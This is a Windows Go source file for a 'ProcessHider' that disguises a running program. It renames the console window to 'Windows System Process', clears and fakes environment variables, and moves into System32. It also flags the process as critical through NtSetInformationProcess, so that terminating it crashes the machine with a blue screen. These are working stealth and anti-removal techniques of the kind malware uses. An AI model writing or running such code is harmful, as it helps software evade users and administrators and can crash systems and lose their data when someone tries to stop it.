//go:build windows

package process

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

var (
	kernel32                    = syscall.NewLazyDLL("kernel32.dll")
	ntdll                       = syscall.NewLazyDLL("ntdll.dll")
	procSetConsoleTitleW        = kernel32.NewProc("SetConsoleTitleW")
	procNtSetInformationProcess = ntdll.NewProc("NtSetInformationProcess")
)

const (
	ProcessBreakOnTermination = 0x1D
)

func (p *ProcessHider) hideWindows() error {
	// Method 1: Change console window title to something innocuous
	if err := p.changeConsoleTitle("Windows System Process"); err != nil {
		fmt.Printf("Warning: failed to change console title: %v\n", err)
	}

	// Method 2: Try to make the process critical (requires admin privileges)
	if err := p.makeProcessCritical(); err != nil {
		fmt.Printf("Warning: failed to make process critical: %v\n", err)
	}

	// Method 3: Clear identifying environment variables
	p.clearWindowsEnvironment()

	// Method 4: Change working directory
	if err := os.Chdir("C:\\Windows\\System32"); err != nil {
		fmt.Printf("Warning: failed to change working directory: %v\n", err)
	}

	return nil
}

func (p *ProcessHider) changeConsoleTitle(title string) error {
	titlePtr, err := syscall.UTF16PtrFromString(title)
	if err != nil {
		return err
	}

	ret, _, err := procSetConsoleTitleW.Call(uintptr(unsafe.Pointer(titlePtr)))
	if ret == 0 {
		return err
	}

	return nil
}

func (p *ProcessHider) makeProcessCritical() error {
	// This makes the process critical, causing a BSOD if terminated
	// Should only be used in extreme cases and requires admin privileges

	handle := uintptr(0xffffffffffffffff) // Current process handle
	value := uintptr(1)

	ret, _, err := procNtSetInformationProcess.Call(
		handle,
		ProcessBreakOnTermination,
		uintptr(unsafe.Pointer(&value)),
		unsafe.Sizeof(value),
	)

	if ret != 0 {
		return fmt.Errorf("NtSetInformationProcess failed with status: 0x%x (%v)", ret, err)
	}

	return nil
}

func (p *ProcessHider) clearWindowsEnvironment() {
	// Clear environment variables that might identify the process
	os.Clearenv()

	// Set minimal Windows environment
	os.Setenv("PATH", "C:\\Windows\\System32;C:\\Windows")
	os.Setenv("SYSTEMROOT", "C:\\Windows")
	os.Setenv("WINDIR", "C:\\Windows")
	os.Setenv("COMPUTERNAME", "SYSTEM")
}

func (p *ProcessHider) hideLinux() error {
	return nil
}

func (p *ProcessHider) hideDarwin() error {
	return nil
}
